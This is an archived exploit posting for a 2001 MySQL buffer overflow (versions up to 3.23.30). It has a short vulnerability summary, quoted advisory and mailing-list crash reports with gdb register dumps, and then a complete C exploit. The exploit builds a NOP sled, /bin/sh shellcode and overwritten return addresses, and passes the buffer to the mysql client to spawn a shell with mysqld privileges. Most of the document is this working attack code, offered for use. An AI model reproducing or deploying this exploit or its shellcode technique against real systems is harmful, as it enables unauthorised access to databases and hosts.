source: http://www.securityfocus.com/bid/2262/info

MySQL is a widely used Open Source database tool. Versions of MySQL up to and including 3.23.30 are vulnerable to a buffer overflow attack.

By supplying an excessively long string as an argument for a SELECT statement, it is possible for a local attacker to overflow mysql's query string buffer.

As a result of this overflow, excessive data copied onto the stack can overwrite critical parts of the stack frame such as the calling function's return address. Since this data is supplied by the user, it can be made to alter the program's flow of execution. 

/*

 Linux MySQL Exploit by Luis Miguel Silva [aka wC]
 lms@ispgaya.pt
 19/01/y2k+1

 Compile:

   gcc MySQLXploit.c -o MySQLX

 Run with:

   You can specify the offset for the exploit passing it as the 1st arg...

   Example: ./MySQLX 0 ---> this is the default offset :]

 Advisorie:
 [from a bugtraq email]

 Hi,

 all versions of MySQL < 3.23.31 have a buffer-overflow which crashs the
 server and which seems to be exploitable (ie. 4141414 in eip)

 Problem :
 An attacker could gain mysqld privileges (gaining access to all the
 databases)

 Requirements :
 You need a valid login/password to exploit this

 Solution :
 Upgrade to 3.23.31

 Proof-of-concept code :
 None

 Credits :
 I'm not the discoverer of this bug
 The first public report was made by tharbad@kaotik.org via the MySQL
 mailing-list
 See the following mails for details

 Regards,
 Nicob

 Here the original post to the MySQL mailing-list :
 ==================================================

 On Jan 12, Jo?o Gouveia wrote:
 > Hi,
 >
  I believe i've found a problem in MySql. Here are some test's i've made
in
 > 3.22.27 x86( also tested on v3.22.32 - latest stable, although i didn't
 > debug it, just tested to see if crashes ).Confirmed up to latest 3.23

 > On one terminal:
 > <quote>
 > spike:/var/mysql # /sbin/init.d/mysql start
 > Starting service MySQL.
 > Starting mysqld daemon with databases from /var/mysql
 > done
 > spike:/var/mysql #
 ></quote>
 >
 > On the other terminal:
 > <quote>
 > jroberto@spike:~ > msql -p -e 'select a.'`perl
-e'printf("A"x130)'`'.b'
 > Enter password:
 > (hanged..^C)
 > </quote>
 >
 > On the first terminal i got:
 > <quote>
 > sike:/var/mysql # /usr/bin/safe_mysqld: line 149: 15557 Segmentation
fault
 > nohup
 > $ledir/myqld --basedir=$MY_BASEDIR_VERSION --datadir=$DATADIR
--skip-lockin
 > g "$@" >>$err_log 2>&1>
 > Number of processes running now: 0
 > mysqld restarted on  Fri Jan 12 07:10:54 WET 2001
 > mysqld daemon ended
 > </quote>
 >
 > gdb shows the following:
 > <quote>
 > (gdb) run
 > Starting program: /usr/sbin/mysqld
 > [New Thread 16897 (manager thread)]
 > [New Thread 16891 (initial thread)]
 > [New Thread 16898]
 > /usr/sbin/mysqld: ready for connections
 > [New Thread 16916]
 > [Switching to Thread 16916]
 >
 > Program received signal SIGSEGV, Segmentation fault.
 > 0x41414141 in ?? ()
 > (gdb) info all-registers
 > eax            0x1      1
 > ecx            0x68     104
 > edx            0x8166947        135686471
 > ebx            0x41414141       1094795585
 > esp            0xbf5ff408       0xbf5ff408
 > ebp            0x41414141       0x41414141
 > esi            0x41414141       1094795585
 > edi            0x0      0
 > eip            0x41414141       0x41414141
 > eflags         0x10246  66118
 > cs             0x23     35
 > ss             0x2b     43
 > ds             0x2b     43
 > es             0x2b     43
 > fs             0x0      0
 > gs             0x0      0
 > (gdb)
 > </quote>
 >
 > looks like a tipical overflow to me.
 > Please reply asap, at least to tell me i'me not seeing things. :-)>
 > Best regards,
 >
 > Joao Gouveia aka Tharbad.
 >
 > tharbad@kaotik.org

 Here the reponse to a email I send today to the MySQL list :
 ============================================================

 Sergei Golubchik (MySQL team) wrote :
 >
 > Hi!
 >
 > On Jan 18, Nicolas GREGOIRE wrote:
 > > Hi,
 > >
 > > Still not any info about the buffer-overflow discovered last week ?
 > > Shouldn't be fixed at the beginning of the week ?
 > >
 > > Please, dear MySQL team, give us info !!
 > >
 > > Regards,
 > > Nicob
 >
 > Fixed in latest release (3.23.31).
 >
 > Regards,
 > Sergei

 Here an part of the 3.23.30 to 3.23.31 diff :
 =============================================

 +Changes in release 3.23.31
 +--------------------------
 +
 +   * Fixed security bug in something (please upgrade if you are using a
 +     earlier MySQL 3.23 version).

 End of Advisorie

 Final Words: Yes..i'm still alive...<g> [just a'sleep..]

 A big kiss to niness and hugs to all my friends...
 lucipher && all of the unsecurity.org crew...
 JFA and all of the AngelSP [pseudo :P]'crew...
 Ahmm...i just wave everybody :]

*/

#include <stdio.h>

#define DEFAULT_OFFSET 0
#define DEFAULT_BUFFER_SIZE 130
#define NOP 0x90

// Our EVIL code...
char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";

unsigned
long get_sp(void) {
   __asm__("movl %esp,%eax");
}

// Where it all happens...
main(int argc, char *argv[])
{
 char *buffer, *ptr, tmp[1500];
 long *addr_ptr, addr;
 int i,bsize=DEFAULT_BUFFER_SIZE,offset=DEFAULT_OFFSET;

 printf("\nMySQL [al versions < 3.23.31] Local Exploit by
lms@ispgaya.pt\n\n");
 if (argc==2) offset=atoi(argv[1]);
 else
   printf("Happy toughts: Did you know you can pass a offset as argv[1]? :]\n");

 printf("Trying to allocate memory for buffer (%d bytes)...",bsize);
 if (!(buffer = malloc(bsize))) {
   printf("ERROR!\n");
   printf("Couldn't allocate memory...\n");
   printf("Exiting...\n");
   exit(0);
 }
 printf("SUCCESS!\n");
 addr=get_sp()-offset;
 printf("Using address : 0x%x\n", addr);
 printf("Offset        : %d\n",offset);
 printf("Buffer Size   : %d\n",bsize);
 ptr=buffer;
 addr_ptr=(long *) ptr;
 for (i=0;i<bsize;i+=4) *(addr_ptr++)=addr;
 for (i=0;i<bsize/2;i++) buffer[i]=NOP;
 ptr=buffer+((bsize/2)-(strlen(shellcode)/2));
 for (i=0;i<strlen(shellcode);i++) *(ptr++)=shellcode[i];
 buffer[bsize-1]='\0';
 snprintf(tmp,sizeof(tmp),"mysql -p -e 'select a.'%s'.b'",buffer);
 printf("Oh k...i have the evil'buffer right here :P\n");
 printf("So...[if all went well], prepare to be r00t...\n");
 system(tmp);
}